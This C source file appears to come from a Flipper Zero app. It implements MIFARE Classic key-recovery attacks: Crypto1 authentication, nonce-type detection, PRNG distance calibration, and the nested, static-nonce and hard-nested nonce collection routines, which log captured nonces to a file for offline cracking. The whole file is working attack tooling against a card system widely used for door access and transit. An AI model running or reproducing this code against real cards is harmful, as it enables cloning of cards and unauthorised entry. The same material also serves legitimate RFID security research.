#include "nested.h"

#include <furi_hal_nfc.h>
#include "../../lib/parity/parity.h"
#include "../../lib/crypto1/crypto1.h"
#define TAG "Nested"

uint16_t nfca_get_crc16(uint8_t* buff, uint16_t len) {
    uint16_t crc = 0x6363; // NFCA_CRC_INIT
    uint8_t byte = 0;

    for(uint8_t i = 0; i < len; i++) {
        byte = buff[i];
        byte ^= (uint8_t)(crc & 0xff);
        byte ^= byte << 4;
        crc = (crc >> 8) ^ (((uint16_t)byte) << 8) ^ (((uint16_t)byte) << 3) ^
              (((uint16_t)byte) >> 4);
    }

    return crc;
}

void nfca_append_crc16(uint8_t* buff, uint16_t len) {
    uint16_t crc = nfca_get_crc16(buff, len);
    buff[len] = (uint8_t)crc;
    buff[len + 1] = (uint8_t)(crc >> 8);
}

bool mifare_sendcmd_short(
    Crypto1* crypto,
    FuriHalNfcTxRxContext* tx_rx,
    bool crypted,
    uint32_t cmd,
    uint32_t data) {
    uint16_t pos;
    uint8_t dcmd[4] = {cmd, data, 0x00, 0x00};
    nfca_append_crc16(dcmd, 2);

    memset(tx_rx->tx_data, 0, sizeof(tx_rx->tx_data));
    memset(tx_rx->tx_parity, 0, sizeof(tx_rx->tx_parity));

    if(crypted) {
        for(pos = 0; pos < 4; pos++) {
            uint8_t res = crypto1_byte(crypto, 0x00, 0) ^ dcmd[pos];
            tx_rx->tx_data[pos] = res;
            tx_rx->tx_parity[0] |=
                (((crypto1_filter(crypto->odd) ^ oddparity8(dcmd[pos])) & 0x01) << (7 - pos));
        }

        tx_rx->tx_rx_type = FuriHalNfcTxRxTypeRaw;
        tx_rx->tx_bits = 4 * 8;
    } else {
        for(pos = 0; pos < 2; pos++) {
            tx_rx->tx_data[pos] = dcmd[pos];
        }

        tx_rx->tx_rx_type = FuriHalNfcTxRxTypeRxNoCrc;
        tx_rx->tx_bits = 2 * 8;
    }

    if(!furi_hal_nfc_tx_rx(tx_rx, 6)) return false;

    return true;
}

bool mifare_classic_authex(
    Crypto1* crypto,
    FuriHalNfcTxRxContext* tx_rx,
    uint32_t uid,
    uint32_t blockNo,
    uint32_t keyType,
    uint64_t ui64Key,
    bool isNested,
    uint32_t* ntptr) {
    uint32_t nt, ntpp; // Supplied tag nonce
    uint8_t nr[4];

    // "random" reader nonce:
    nfc_util_num2bytes(prng_successor(0, 32), 4, nr); // DWT->CYCCNT

    // Transmit MIFARE_CLASSIC_AUTH
    if(!mifare_sendcmd_short(crypto, tx_rx, isNested, 0x60 + (keyType & 0x01), blockNo)) {
        return false;
    };

    memset(tx_rx->tx_data, 0, sizeof(tx_rx->tx_data));
    memset(tx_rx->tx_parity, 0, sizeof(tx_rx->tx_parity));

    nt = (uint32_t)nfc_util_bytes2num(tx_rx->rx_data, 4);

    if(isNested) crypto1_reset(crypto); // deinit

    crypto1_init(crypto, ui64Key);

    if(isNested) {
        nt = crypto1_word(crypto, nt ^ uid, 1) ^ nt;
    } else {
        crypto1_word(crypto, nt ^ uid, 0);
    }

    // save Nt
    if(ntptr) *ntptr = nt;

    // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
    tx_rx->tx_parity[0] = 0;
    for(uint8_t i = 0; i < 4; i++) {
        tx_rx->tx_data[i] = crypto1_byte(crypto, nr[i], 0) ^ nr[i];
        tx_rx->tx_parity[0] |=
            (((crypto1_filter(crypto->odd) ^ oddparity8(nr[i])) & 0x01) << (7 - i));
    }

    nt = prng_successor(nt, 32);

    for(uint8_t i = 4; i < 8; i++) {
        nt = prng_successor(nt, 8);
        tx_rx->tx_data[i] = crypto1_byte(crypto, 0x00, 0) ^ (nt & 0xff);
        tx_rx->tx_parity[0] |=
            (((crypto1_filter(crypto->odd) ^ oddparity8(nt & 0xff)) & 0x01) << (7 - i));
    }

    tx_rx->tx_rx_type = FuriHalNfcTxRxTypeRaw;
    tx_rx->tx_bits = 8 * 8;

    if(!furi_hal_nfc_tx_rx(tx_rx, 25)) {
        return false;
    };

    uint32_t answer = (uint32_t)nfc_util_bytes2num(tx_rx->rx_data, 4);

    ntpp = prng_successor(nt, 32) ^ crypto1_word(crypto, 0, 0);

    if(answer != ntpp) {
        return false;
    }

    return true;
}

static int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, const uint8_t* parity) {
    return ((oddparity8((Nt >> 24) & 0xFF) ==
             ((parity[0]) ^ oddparity8((NtEnc >> 24) & 0xFF) ^ FURI_BIT(Ks1, 16))) &&
            (oddparity8((Nt >> 16) & 0xFF) ==
             ((parity[1]) ^ oddparity8((NtEnc >> 16) & 0xFF) ^ FURI_BIT(Ks1, 8))) &&
            (oddparity8((Nt >> 8) & 0xFF) ==
             ((parity[2]) ^ oddparity8((NtEnc >> 8) & 0xFF) ^ FURI_BIT(Ks1, 0)))) ?
               1 :
               0;
}

void nonce_distance(uint32_t* msb, uint32_t* lsb) {
    uint16_t x = 1, pos;
    uint8_t calc_ok = 0;

    for(uint16_t i = 1; i; ++i) {
        pos = (x & 0xff) << 8 | x >> 8;

        if((pos == *msb) & !(calc_ok >> 0 & 0x01)) {
            *msb = i;
            calc_ok |= 0x01;
        }

        if((pos == *lsb) & !(calc_ok >> 1 & 0x01)) {
            *lsb = i;
            calc_ok |= 0x02;
        }

        if(calc_ok == 0x03) {
            return;
        }

        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
    }
}

bool validate_prng_nonce(uint32_t nonce) {
    uint32_t msb = nonce >> 16;
    uint32_t lsb = nonce & 0xffff;
    nonce_distance(&msb, &lsb);
    return ((65535 - msb + lsb) % 65535) == 16;
}

MifareNestedNonceType nested_check_nonce_type(FuriHalNfcTxRxContext* tx_rx, uint8_t blockNo) {
    uint32_t nonces[5] = {};
    uint8_t sameNonces = 0;
    uint8_t hardNonces = 0;
    Crypto1 crypt;
    Crypto1* crypto = {&crypt};

    for(int32_t i = 0; i < 5; i++) {
        // Setup nfc poller
        nfc_activate();
        furi_hal_nfc_activate_nfca(100, NULL);

        // Start communication
        bool success = mifare_sendcmd_short(crypto, tx_rx, false, 0x60, blockNo);
        if(!success) {
            continue;
        };

        uint32_t nt = (uint32_t)nfc_util_bytes2num(tx_rx->rx_data, 4);
        if(nt == 0) continue;
        if(!validate_prng_nonce(nt)) hardNonces++;
        nonces[i] = nt;

        nfc_deactivate();
    }

    for(int32_t i = 0; i < 5; i++) {
        for(int32_t j = 0; j < 5; j++) {
            if(i != j && nonces[j] && nonces[i] == nonces[j]) {
                sameNonces++;
            }
        }
    }

    if(!nonces[4]) {
        return MifareNestedNonceNoTag;
    }

    if(sameNonces > 3) {
        return MifareNestedNonceStatic;
    }

    if(hardNonces > 3) {
        return MifareNestedNonceHard;
    }

    return MifareNestedNonceWeak;
}

struct nonce_info_static nested_static_nonce_attack(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint8_t targetBlockNo,
    uint8_t targetKeyType,
    uint64_t ui64Key) {
    uint32_t cuid = 0;
    Crypto1* crypto = malloc(sizeof(Crypto1));
    struct nonce_info_static r;

    r.full = false;

    // Setup nfc poller
    nfc_activate();
    if(!furi_hal_nfc_activate_nfca(200, &cuid)) {
        free(crypto);
        return r;
    }

    r.cuid = cuid;

    uint32_t nt1;
    uint32_t nt_unused;

    crypto1_reset(crypto);

    mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt1);

    if(targetKeyType == 1 && nt1 == 0x009080A2) {
        r.target_nt[0] = prng_successor(nt1, 161);
        r.target_nt[1] = prng_successor(nt1, 321);
    } else {
        r.target_nt[0] = prng_successor(nt1, 160);
        r.target_nt[1] = prng_successor(nt1, 320);
    }

    bool success =
        mifare_sendcmd_short(crypto, tx_rx, true, 0x60 + (targetKeyType & 0x01), targetBlockNo);

    if(!success) {
        free(crypto);
        return r;
    };

    uint32_t nt2 = nfc_util_bytes2num(tx_rx->rx_data, 4);
    r.target_ks[0] = nt2 ^ r.target_nt[0];

    nfc_activate();

    if(!furi_hal_nfc_activate_nfca(200, &cuid)) {
        free(crypto);
        return r;
    }

    crypto1_reset(crypto);

    mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt1);

    mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, true, &nt_unused);

    success =
        mifare_sendcmd_short(crypto, tx_rx, true, 0x60 + (targetKeyType & 0x01), targetBlockNo);

    free(crypto);

    if(!success) {
        return r;
    };

    uint32_t nt3 = (uint32_t)nfc_util_bytes2num(tx_rx->rx_data, 4);

    r.target_ks[1] = nt3 ^ r.target_nt[1];
    r.full = true;

    nfc_deactivate();

    return r;
}

uint32_t nested_calibrate_distance(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint64_t ui64Key,
    uint32_t delay,
    bool full) {
    uint32_t cuid = 0;
    Crypto1* crypto = malloc(sizeof(Crypto1));
    uint32_t nt1, nt2, i = 0, davg = 0, dmin = 0, dmax = 0, rtr = 0, unsuccessful_tries = 0;
    uint32_t max_prng_value = full ? 65565 : 1200;
    uint32_t rounds = full ? 5 : 17; // full does not require precision
    uint32_t collected = 0;

    for(rtr = 0; rtr < rounds; rtr++) {
        nfc_activate();
        if(!furi_hal_nfc_activate_nfca(200, &cuid)) break;

        if(!mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt1)) {
            continue;
        }

        furi_delay_us(delay);

        if(!mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, true, &nt2)) {
            continue;
        }

        // NXP Mifare is typical around 840, but for some unlicensed/compatible mifare tag this can be 160
        uint32_t nttmp = prng_successor(nt1, 100);

        for(i = 101; i < max_prng_value; i++) {
            nttmp = prng_successor(nttmp, 1);
            if(nttmp == nt2) break;
        }

        if(i != max_prng_value) {
            if(rtr != 0) {
                davg += i;
                dmin = MIN(dmin, i);
                dmax = MAX(dmax, i);
            } else {
                dmin = dmax = i;
            }

            FURI_LOG_D(TAG, "Calibrating: ntdist=%lu", i);
            collected++;
        } else {
            unsuccessful_tries++;
            if(unsuccessful_tries > 12) {
                free(crypto);
                FURI_LOG_E(
                    TAG,
                    "Tag isn't vulnerable to nested attack (random numbers are not predictable)");
                return 0;
            }
        }
    }

    if(collected > 1) davg = (davg + (collected - 1) / 2) / (collected - 1);

    davg = MIN(MAX(dmin, davg), dmax);

    FURI_LOG_I(
        TAG,
        "Calibration completed: rtr=%lu min=%lu max=%lu avg=%lu collected=%lu",
        rtr,
        dmin,
        dmax,
        davg,
        collected);

    free(crypto);

    nfc_deactivate();

    return davg;
}

struct distance_info nested_calibrate_distance_info(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint64_t ui64Key) {
    uint32_t cuid = 0;
    Crypto1* crypto = malloc(sizeof(Crypto1));
    uint32_t nt1, nt2, i = 0, davg = 0, dmin = 0, dmax = 0, rtr = 0, unsuccessful_tries = 0;
    struct distance_info r;
    r.min_prng = 0;
    r.max_prng = 0;
    r.mid_prng = 0;

    for(rtr = 0; rtr < 10; rtr++) {
        nfc_activate();
        if(!furi_hal_nfc_activate_nfca(200, &cuid)) break;

        mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt1);

        mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, true, &nt2);

        // NXP Mifare is typical around 840, but for some unlicensed/compatible mifare tag this can be 160
        uint32_t nttmp = prng_successor(nt1, 1);

        for(i = 2; i < 65565; i++) {
            nttmp = prng_successor(nttmp, 1);
            if(nttmp == nt2) break;
        }

        if(i != 65565) {
            if(rtr != 0) {
                davg += i;
                if(dmin == 0) {
                    dmin = i;
                } else {
                    dmin = MIN(dmin, i);
                }
                dmax = MAX(dmax, i);
            }

            FURI_LOG_D(TAG, "Calibrating: ntdist=%lu", i);
        } else {
            unsuccessful_tries++;
            if(unsuccessful_tries > 12) {
                free(crypto);

                FURI_LOG_E(
                    TAG,
                    "Tag isn't vulnerable to nested attack (random numbers are not predictable)");

                return r;
            }
        }
    }

    if(rtr > 1) davg = (davg + (rtr - 1) / 2) / (rtr - 1);

    FURI_LOG_I(
        TAG, "Calibration completed: rtr=%lu min=%lu max=%lu avg=%lu", rtr, dmin, dmax, davg);

    r.min_prng = dmin;
    r.max_prng = dmax;
    r.mid_prng = davg;

    free(crypto);

    nfc_deactivate();

    return r;
}

struct nonce_info nested_attack(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint8_t targetBlockNo,
    uint8_t targetKeyType,
    uint64_t ui64Key,
    uint32_t distance,
    uint32_t delay) {
    uint32_t cuid = 0;
    Crypto1* crypto = malloc(sizeof(Crypto1));
    uint8_t par_array[4] = {0x00};
    uint32_t nt1, nt2, ks1, i = 0, j = 0;
    struct nonce_info r;
    uint32_t dmin = distance - 2;
    uint32_t dmax = distance + 2;

    r.full = false;

    for(i = 0; i < 2; i++) { // look for exactly two different nonces
        r.target_nt[i] = 0;

        while(r.target_nt[i] == 0) { // continue until we have an unambiguous nonce
            nfc_activate();
            if(!furi_hal_nfc_activate_nfca(200, &cuid)) {
                free(crypto);
                return r;
            }

            r.cuid = cuid;

            mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt1);

            furi_delay_us(delay);

            bool success = mifare_sendcmd_short(
                crypto, tx_rx, true, 0x60 + (targetKeyType & 0x01), targetBlockNo);

            if(!success) continue;

            nt2 = nfc_util_bytes2num(tx_rx->rx_data, 4);

            // Parity validity check
            for(j = 0; j < 4; j++) {
                par_array[j] =
                    (oddparity8(tx_rx->rx_data[j]) != ((tx_rx->rx_parity[0] >> (7 - j)) & 0x01));
            }

            uint32_t ncount = 0;
            uint32_t nttest = prng_successor(nt1, dmin - 1);

            for(j = dmin; j < dmax + 1; j++) {
                nttest = prng_successor(nttest, 1);
                ks1 = nt2 ^ nttest;

                if(valid_nonce(nttest, nt2, ks1, par_array)) {
                    if(ncount > 0) { // we are only interested in disambiguous nonces, try again
                        FURI_LOG_D(TAG, "Nonce#%lu: dismissed (ambiguous), ntdist=%lu", i + 1, j);
                        r.target_nt[i] = 0;
                        break;
                    }

                    if(delay) {
                        // will predict later
                        r.target_nt[i] = nt1;
                        r.target_ks[i] = nt2;
                    } else {
                        r.target_nt[i] = nttest;
                        r.target_ks[i] = ks1;
                    }

                    memcpy(&r.parity[i], par_array, 4);
                    ncount++;

                    if(i == 1 &&
                       (r.target_nt[0] == r.target_nt[1] ||
                        r.target_ks[0] == r.target_ks[1])) { // we need two different nonces
                        r.target_nt[i] = 0;
                        FURI_LOG_D(TAG, "Nonce#2: dismissed (= nonce#1), ntdist=%lu", j);
                        break;
                    }

                    FURI_LOG_D(TAG, "Nonce#%lu: valid, ntdist=%lu", i + 1, j);
                }
            }

            if(r.target_nt[i] == 0 && j == dmax + 1) {
                FURI_LOG_D(TAG, "Nonce#%lu: dismissed (all invalid)", i + 1);
            }
        }
    }

    if(r.target_nt[0] && r.target_nt[1]) {
        r.full = true;
    }

    free(crypto);

    nfc_deactivate();

    return r;
}

struct nonce_info_hard nested_hard_nonce_attack(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint8_t targetBlockNo,
    uint8_t targetKeyType,
    uint64_t ui64Key,
    uint32_t* found,
    uint32_t* first_byte_sum,
    Stream* file_stream) {
    uint32_t cuid = 0;
    uint8_t same = 0;
    uint64_t previous = 0;
    Crypto1* crypto = malloc(sizeof(Crypto1));
    uint8_t par_array[4] = {0x00};
    struct nonce_info_hard r;
    r.full = false;
    r.static_encrypted = false;

    for(uint32_t i = 0; i < 8; i++) {
        nfc_activate();
        if(!furi_hal_nfc_activate_nfca(200, &cuid)) {
            free(crypto);
            return r;
        }

        r.cuid = cuid;

        if(!mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, NULL))
            continue;

        if(!mifare_sendcmd_short(crypto, tx_rx, true, 0x60 + (targetKeyType & 0x01), targetBlockNo))
            continue;

        uint64_t nt = nfc_util_bytes2num(tx_rx->rx_data, 4);

        for(uint32_t j = 0; j < 4; j++) {
            par_array[j] =
                (oddparity8(tx_rx->rx_data[j]) != ((tx_rx->rx_parity[0] >> (7 - j)) & 0x01));
        }

        uint8_t pbits = 0;
        for(uint8_t j = 0; j < 4; j++) {
            uint8_t p = oddparity8(tx_rx->rx_data[j]);
            if(par_array[j]) {
                p ^= 1;
            }
            pbits <<= 1;
            pbits |= p;
        }

        // update unique nonces
        if(!found[tx_rx->rx_data[0]]) {
            *first_byte_sum += evenparity32(pbits & 0x08);
            found[tx_rx->rx_data[0]]++;
        }

        if(nt == previous) {
            same++;
        }

        previous = nt;

        FuriString* row = furi_string_alloc_printf("%llu|%u\n", nt, pbits);
        stream_write_string(file_stream, row);

        FURI_LOG_D(TAG, "Accured %lu/8 nonces", i + 1);
        furi_string_free(row);
    }

    if(same > 4) {
        r.static_encrypted = true;
    }

    r.full = true;

    free(crypto);

    nfc_deactivate();

    return r;
}

NestedCheckKeyResult nested_check_key(
    FuriHalNfcTxRxContext* tx_rx,
    uint8_t blockNo,
    uint8_t keyType,
    uint64_t ui64Key) {
    uint32_t cuid = 0;
    uint32_t nt;

    nfc_activate();
    if(!furi_hal_nfc_activate_nfca(200, &cuid)) return NestedCheckKeyNoTag;

    FURI_LOG_D(
        TAG, "Checking %c key %012llX for block %u", !keyType ? 'A' : 'B', ui64Key, blockNo);

    Crypto1* crypto = malloc(sizeof(Crypto1));

    bool success =
        mifare_classic_authex(crypto, tx_rx, cuid, blockNo, keyType, ui64Key, false, &nt);

    free(crypto);

    nfc_deactivate();

    return success ? NestedCheckKeyValid : NestedCheckKeyInvalid;
}

bool nested_check_block(FuriHalNfcTxRxContext* tx_rx, uint8_t blockNo, uint8_t keyType) {
    uint32_t cuid = 0;

    nfc_activate();
    if(!furi_hal_nfc_activate_nfca(200, &cuid)) return false;

    Crypto1* crypto = malloc(sizeof(Crypto1));

    bool success = mifare_sendcmd_short(crypto, tx_rx, false, 0x60 + (keyType & 0x01), blockNo);

    free(crypto);

    nfc_deactivate();

    return success;
}

void nested_get_data(FuriHalNfcDevData* dev_data) {
    nfc_activate();
    furi_hal_nfc_detect(dev_data, 400);
    nfc_deactivate();
}

void nfc_activate() {
    nfc_deactivate();

    // Setup nfc poller
    furi_hal_nfc_exit_sleep();
    furi_hal_nfc_ll_txrx_on();
    furi_hal_nfc_ll_poll();
    if(furi_hal_nfc_ll_set_mode(
           FuriHalNfcModePollNfca, FuriHalNfcBitrate106, FuriHalNfcBitrate106) !=
       FuriHalNfcReturnOk)
        return;

    furi_hal_nfc_ll_set_fdt_listen(FURI_HAL_NFC_LL_FDT_LISTEN_NFCA_POLLER);
    furi_hal_nfc_ll_set_fdt_poll(FURI_HAL_NFC_LL_FDT_POLL_NFCA_POLLER);
    furi_hal_nfc_ll_set_error_handling(FuriHalNfcErrorHandlingNfc);
    furi_hal_nfc_ll_set_guard_time(FURI_HAL_NFC_LL_GT_NFCA);
}

void nfc_deactivate() {
    furi_hal_nfc_ll_txrx_off();
    furi_hal_nfc_start_sleep();
    furi_hal_nfc_sleep();
}
